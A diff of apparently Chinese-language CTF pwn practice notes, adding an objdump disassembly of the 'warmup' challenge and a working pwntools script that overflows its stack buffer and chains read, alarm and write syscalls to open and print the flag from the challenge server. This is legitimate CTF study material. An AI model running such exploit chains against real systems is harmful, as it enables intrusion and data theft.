@@ -15,10 +15,12 @@ tags:
 [toc]
 
 # 刷 [BUUCTF](https://buuoj.cn/challenges)中的Pwn
+做了没几题发现BUUCTF归档了。。。移到了[ctf2](https://ctf2.dasctf.com)
 
 ## [test your nc](https://buuoj.cn/challenges#test_your_nc)
 ```sh
 nc [ip] [port]
+ncat --ssl [ip] [port]
 ```
 简单连接远方机器
 
@@ -286,6 +288,121 @@ $ pwn checksec ./pwn
 ```
 开启了Canary的
 
+# [ctf2](https://ctf2.dasctf.com)
+## warmup
+```sh
+$ objdump -d ./warmup 
+
+./warmup:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+080480d8 <.text>:
+ 80480d8:	83 ec 10             	sub    $0x10,%esp
+ 80480db:	c7 04 24 0a 00 00 00 	movl   $0xa,(%esp)
+ 80480e2:	e8 26 00 00 00       	call   0x804810d
+ 80480e7:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+ 80480ee:	c7 44 24 04 bc 91 04 	movl   $0x80491bc,0x4(%esp)
+ 80480f5:	08 
+ 80480f6:	c7 44 24 08 16 00 00 	movl   $0x16,0x8(%esp)
+ 80480fd:	00 
+ 80480fe:	e8 32 00 00 00       	call   0x8048135
+ 8048103:	e8 52 00 00 00       	call   0x804815a
+ 8048108:	e8 40 00 00 00       	call   0x804814d
+ 804810d:	b8 1b 00 00 00       	mov    $0x1b,%eax
+ 8048112:	8b 5c 24 04          	mov    0x4(%esp),%ebx
+ 8048116:	cd 80                	int    $0x80
+ 8048118:	85 c0                	test   %eax,%eax
+ 804811a:	78 31                	js     0x804814d
+ 804811c:	c3                   	ret    
+ 804811d:	b8 03 00 00 00       	mov    $0x3,%eax
+ 8048122:	8b 5c 24 04          	mov    0x4(%esp),%ebx
+ 8048126:	8b 4c 24 08          	mov    0x8(%esp),%ecx
+ 804812a:	8b 54 24 0c          	mov    0xc(%esp),%edx
+ 804812e:	cd 80                	int    $0x80
+ 8048130:	85 c0                	test   %eax,%eax
+ 8048132:	78 19                	js     0x804814d
+ 8048134:	c3                   	ret    
+ 8048135:	b8 04 00 00 00       	mov    $0x4,%eax
+ 804813a:	8b 5c 24 04          	mov    0x4(%esp),%ebx
+ 804813e:	8b 4c 24 08          	mov    0x8(%esp),%ecx
+ 8048142:	8b 54 24 0c          	mov    0xc(%esp),%edx
+ 8048146:	cd 80                	int    $0x80
+ 8048148:	85 c0                	test   %eax,%eax
+ 804814a:	78 01                	js     0x804814d
+ 804814c:	c3                   	ret    
+ 804814d:	b8 01 00 00 00       	mov    $0x1,%eax
+ 8048152:	bb 00 00 00 00       	mov    $0x0,%ebx
+ 8048157:	cd 80                	int    $0x80
+ 8048159:	f4                   	hlt    
+ 804815a:	83 ec 30             	sub    $0x30,%esp
+ 804815d:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
+ 8048164:	8d 44 24 10          	lea    0x10(%esp),%eax
+ 8048168:	89 44 24 04          	mov    %eax,0x4(%esp)
+ 804816c:	c7 44 24 08 34 00 00 	movl   $0x34,0x8(%esp)
+ 8048173:	00 
+ 8048174:	e8 a4 ff ff ff       	call   0x804811d
+ 8048179:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+ 8048180:	c7 44 24 04 d3 91 04 	movl   $0x80491d3,0x4(%esp)
+ 8048187:	08 
+ 8048188:	c7 44 24 08 0b 00 00 	movl   $0xb,0x8(%esp)
+ 804818f:	00 
+ 8048190:	e8 a0 ff ff ff       	call   0x8048135
+ 8048195:	b8 af be ad de       	mov    $0xdeadbeaf,%eax
+ 804819a:	b9 af be ad de       	mov    $0xdeadbeaf,%ecx
+ 804819f:	ba af be ad de       	mov    $0xdeadbeaf,%edx
+ 80481a4:	bb af be ad de       	mov    $0xdeadbeaf,%ebx
+ 80481a9:	be af be ad de       	mov    $0xdeadbeaf,%esi
+ 80481ae:	bf af be ad de       	mov    $0xdeadbeaf,%edi
+ 80481b3:	bd af be ad de       	mov    $0xdeadbeaf,%ebp
+ 80481b8:	83 c4 30             	add    $0x30,%esp
+ 80481bb:	c3                   	ret    
+```
+```sh
+0x804810d（alarm）：执行alarm系统调用（eax=0x1b），参数为[esp+4]，失败则退出。
+
+0x804811d（read）：执行read系统调用（eax=0x3），参数为fd, buf, count。
+
+0x8048135（write）：执行write系统调用（eax=0x4），参数为fd, buf, count。
+
+0x804814d（exit）：执行exit(0)（eax=0x1, ebx=0）
+```
+
+```py
+from pwn import *
+
+p = remote("2fc306fb.tcp-ctf2.dasctf.com", 9999, ssl=True)
+
+write = 0x8048135
+read = 0x804811d
+call_write = 0x80480fe
+mov_ebx_ecx_edx_int80 = 0x804813a
+overflow = 0x804815a
+alarm = 0x804810d
+exit = 0x804814d
+data = 0x080491BC
+# read(0, data, 5)
+payload = b'a' * 0x20 + p32(read) + p32(overflow) + p32(0) + p32(data) + p32(0x5)
+p.sendafter(b'2016!\n', payload)
+p.send(b'flag\x00')
+# alarm() -> 10 - 5 = 5 s （利用 alarm 返回值设置 eax=5）
+payload = b'a' * 0x20 + p32(alarm) + p32(mov_ebx_ecx_edx_int80) + p32(overflow) + p32(data) + p32(0)
+sleep(5)
+p.send(payload)
+# read(3, data, 0x40)
+payload = b'a' * 0x20 + p32(read) + p32(overflow) + p32(3) + p32(data) + p32(0x40)
+sleep(0.1)
+p.send(payload)
+# write(1, data, 0x40)
+payload = b'a' * 0x20 + p32(write) + p32(0) + p32(1) + p32(data) + p32(0x40)
+sleep(0.1)
+p.send(payload)
+
+p.interactive()
+```
+
+## babyfengshui_33c3_2016
 
 [back](./)
 
